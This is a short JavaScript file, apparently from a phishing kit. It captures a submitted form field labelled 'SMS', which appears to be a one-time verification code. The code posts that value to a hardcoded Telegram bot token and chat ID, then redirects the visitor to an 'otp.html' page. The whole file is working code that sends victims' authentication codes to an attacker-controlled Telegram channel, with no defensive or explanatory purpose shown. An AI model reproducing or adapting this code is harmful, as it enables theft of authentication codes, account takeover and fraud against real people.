
        
    const TOKEN = "7899898128%3AAAEJuEAq0U6UACFU5yxDXfTACLnfCNwpy0k";
const CHAT_ID = "7338241712";
const URL_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

const form = document.getElementById("fetch");

form.addEventListener("submit", onSubmitTelegram);

function onSubmitTelegram(e) {
  e.preventDefault();

  const { name, } = form;
  const data = {
    name: name.value,
  };

  let message = `<b></b>\n`;
  message += `<b>𝐒𝐌𝐒: </b> ${data.name}`;

  const dataTg = {
    chat_id: CHAT_ID,
    text: message,
    parse_mode: "html",
  };

  const options = {
    method: "POST",
    body: JSON.stringify(dataTg),
    headers: {
      "Content-Type": "application/json",
    },
  };

  fetch(URL_API, options)
    .then((res) => res.json())
    .then((res) => console.log(res))
    .catch((err) => console.log(err));
    
    window.location.href = '/otp.html';
}

